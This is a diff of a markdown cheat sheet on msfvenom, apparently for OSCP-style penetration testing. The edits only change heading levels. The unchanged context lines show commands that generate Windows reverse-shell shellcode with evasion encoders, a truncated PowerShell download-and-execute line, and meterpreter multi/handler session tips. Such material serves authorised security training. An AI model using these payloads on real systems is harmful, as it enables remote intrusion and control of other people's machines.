@@ -13,7 +13,7 @@ weight : 0
 
 Msfvenom is a command line instance of Metasploit that is used to generate and output all of the various types of shell code that are available in Metasploit.
 
-### Flags
+## Flags
 
 MSFVenom Payload Generation One-Liner | Description
 | :------------- | :----------- |
@@ -44,7 +44,7 @@ msfvenom -a x86 –platform Windows -p windows/exec CMD="powershell \“IEX(New-
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b “\x04\xA0” | Bad characters shikata_ga_nai
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b “\x04\xA0” | Bad characters fnstenv_mov
 
-### Examples
+## Examples
 
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,
 
@@ -59,6 +59,6 @@ msf>exploit -j
 
 The -j option is to keep all the connected session in the background.
 
-### URL list
+## URL List
 
 * [Thor-sec.com - msfvenom cheat sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
